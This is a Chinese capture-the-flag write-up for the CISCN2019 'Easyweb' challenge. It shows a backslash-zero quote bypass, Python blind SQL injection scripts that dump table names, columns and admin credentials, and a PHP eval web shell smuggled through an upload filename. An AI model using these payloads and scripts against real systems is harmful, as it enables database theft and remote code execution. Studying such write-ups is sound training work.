# [CISCN2019 总决赛 Day2 Web1]Easyweb 盲注 \\0绕过 文件上传文件名木马

首先开局登入

我们开始目录扫描

扫除 robots.txt



<img src="https://i-blog.csdnimg.cn/blog_migrate/09ab2dd6e54ea6a30755a372e0f6fbca.png" alt="" style="max-height:143px; box-sizing:content-box;" />


现在只有三个文件

最后发现 只有image.php.bak存在



<img src="https://i-blog.csdnimg.cn/blog_migrate/084f2fd5427161c091c657c2dfa708aa.png" alt="" style="max-height:385px; box-sizing:content-box;" />


这里主要的地方是 \\0

因为第一个\会被转义

这里就会变为 \0

表示空白

那我们sql语句就会变为了

```cobol
select * from images where id='\0'
```

但是这里我们不可以使用 \\

因为输入\\

会变为 \

我们是需要空字符

所以我们需要 \\0

绕过

所以最后我们 然后 后面的path 就变为了可控了

```cobol
path=' or 1=1-- +

path=' or 1=2-- +
```

这里显然是盲注了

写个脚本

```cobol
import time
 
import requests
 
baseurl = r"""http://3b01fafd-601d-4401-ab14-0a966f1c0151.node4.buuoj.cn:81/image.php?id=\\0&path="""
flag=''
 
 
for i in range(1000):
    for j in range(127):
        payload = "or 1 = if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{},1))={},1,-1)-- +".format(i,j)
        req=requests.get(url=baseurl+payload)
        if req.status_code == 429:
            time.sleep(0.5)
        if "JFIF" in req.text:
            flag += chr(j)
            print(flag)
```

可以爆出为

```bash
images,users
```

但是这里注意

爆列名的时候 因为 'users' 会给过滤 所以我们要通过16进制来实现

```cobol
users-->0x7573657273
```

```cobol
import time
 
import requests
base_url=r"http://3b01fafd-601d-4401-ab14-0a966f1c0151.node4.buuoj.cn:81/image.php?id=\\0&path="
data=''
#下面的payload需要使用 > 号 而不是 =
payload="or 1 = if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=0x7573657273),{},1))>{},1,-1)-- +"
for i in range(1,10000):
    low = 32
    high = 128
    mid =(low + high) // 2
    while(low < high):
        payload1=payload.format(i,mid)
        r = requests.get(url=base_url+payload1)
        if "JFIF" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 132):
        break
    data+=chr(mid)
    print(data)
```

上面是二分法 快点

```undefined
username,password
```

继续爆数据

```cobol
import time
 
import requests
base_url=r"http://3b01fafd-601d-4401-ab14-0a966f1c0151.node4.buuoj.cn:81/image.php?id=\\0&path="
data=''
#下面的payload需要使用 > 号 而不是 =
payload="or 1 = if(ascii(substr((select group_concat(username,password)from users),{},1))>{},1,-1)-- +"
for i in range(1,10000):
    low = 32
    high = 128
    mid =(low + high) // 2
    while(low < high):
        payload1=payload.format(i,mid)
        r = requests.get(url=base_url+payload1)
        if "JFIF" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 132):
        break
    data+=chr(mid)
    print(data)
```

```cobol
admin
 
4548f7af4fe91b7ff349
```

然后我们登录



<img src="https://i-blog.csdnimg.cn/blog_migrate/07571bf7fafb8b70580e35fb1c47fdde.png" alt="" style="max-height:231px; box-sizing:content-box;" />


随便传递一个



<img src="https://i-blog.csdnimg.cn/blog_migrate/211e46e4d79710066b18b814a3d0ce59.png" alt="" style="max-height:86px; box-sizing:content-box;" />


成功了 我们直接上传木马吧



<img src="https://i-blog.csdnimg.cn/blog_migrate/036c801437d7c89b5ca5da4c76b5ad07.png" alt="" style="max-height:462px; box-sizing:content-box;" />


成功了

但是去访问发现不是



<img src="https://i-blog.csdnimg.cn/blog_migrate/bece1905737315aec36925cd98832226.png" alt="" style="max-height:173px; box-sizing:content-box;" />


这里是文件名 那我们从文件名注入吧

```cobol
Content-Disposition: form-data; name="file"; filename="1.jpg"
 
 
修改 filename为木马
 
Content-Disposition: form-data; name="file"; filename="<?php @eval($_POST['hack']); ?>"
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7292561c60baae93dce0bddf5aedcd07.png" alt="" style="max-height:362px; box-sizing:content-box;" />


过滤了 换短标签看看

```kotlin
Content-Disposition: form-data; name="file"; filename="<?= @eval($_POST['hack']); ?>"
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/9521fdd6b1a8d3fbb53587545d30365b.png" alt="" style="max-height:198px; box-sizing:content-box;" />


访问一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/783e254073043230a79f1ca33e074e08.png" alt="" style="max-height:224px; box-sizing:content-box;" />


成功了 链接一下